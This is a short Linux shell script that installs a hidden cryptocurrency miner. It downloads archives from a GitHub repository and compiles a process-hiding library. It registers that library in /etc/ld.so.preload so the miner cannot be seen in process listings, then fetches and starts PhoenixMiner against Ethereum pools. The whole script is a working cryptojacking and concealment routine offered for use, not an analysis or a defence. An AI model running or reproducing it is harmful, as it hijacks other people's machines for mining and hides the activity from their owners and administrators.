#!/bin/sh
apt -y install libpci-dev
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicPho.zip
unzip magicPho.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/PhoenixMiner_5.3b_Linux.zip
unzip PhoenixMiner_5.3b_Linux.zip
cd PhoenixMiner_5.3b_Linux
chmod +x 1_Ethereum-hiveon.sh
chmod +x 2_Ethereum--miningpoolhub.sh
chmod +x 3_Ehereum-ezil.sh
chmod +x 4_Ethereum-ethermine.sh
chmod +x 5_Ethereum-nanopool_and_email.sh
chmod +x PhoenixMiner
chmod +x start_miner.sh
chmod +x start_miner_etc.sh
./start_miner.sh
